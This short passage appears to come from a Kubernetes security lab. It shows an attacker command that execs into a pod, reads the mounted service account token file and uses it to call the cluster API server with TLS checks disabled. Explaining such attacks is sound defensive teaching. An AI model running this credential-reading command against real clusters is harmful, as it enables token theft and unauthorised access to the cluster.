To access the service account token, an attacker can run the following command:


`kubectl exec -it $POD -- bash -c 'curl https://$KUBERNETES_PORT_443_TCP_ADDR/api --insecure --header "Authorization: Bearer $(cat /run/secrets/kubernetes.io/serviceaccount/token)" && exit'
`{{exec}}

This command fetches the service account token, which is used for authenticating with the Kubernetes API server.



